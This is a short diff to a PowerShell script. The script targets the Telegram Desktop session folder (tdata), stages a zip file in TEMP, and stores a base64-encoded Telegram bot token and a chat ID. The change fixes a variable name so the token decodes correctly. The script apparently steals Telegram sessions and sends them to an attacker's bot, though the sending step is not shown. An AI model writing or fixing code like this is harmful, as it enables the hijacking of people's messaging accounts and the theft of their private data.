@@ -1,7 +1,7 @@
 $src = "$env:APPDATA\Telegram Desktop\tdata"
 $zip = "$env:TEMP\tdata.zip"
 $tent = "Nzk5Mzc1NTI1OTpBQUhQRUZSTFY1dmY1T1lvQnNRQjVlbnJSaXpSbC1hNFZKRQo="
-$tentet = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedToken))
+$tentet = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tent))
 $cht = "5047177665"
 
 if (-not (Test-Path $src)) { exit 1 }
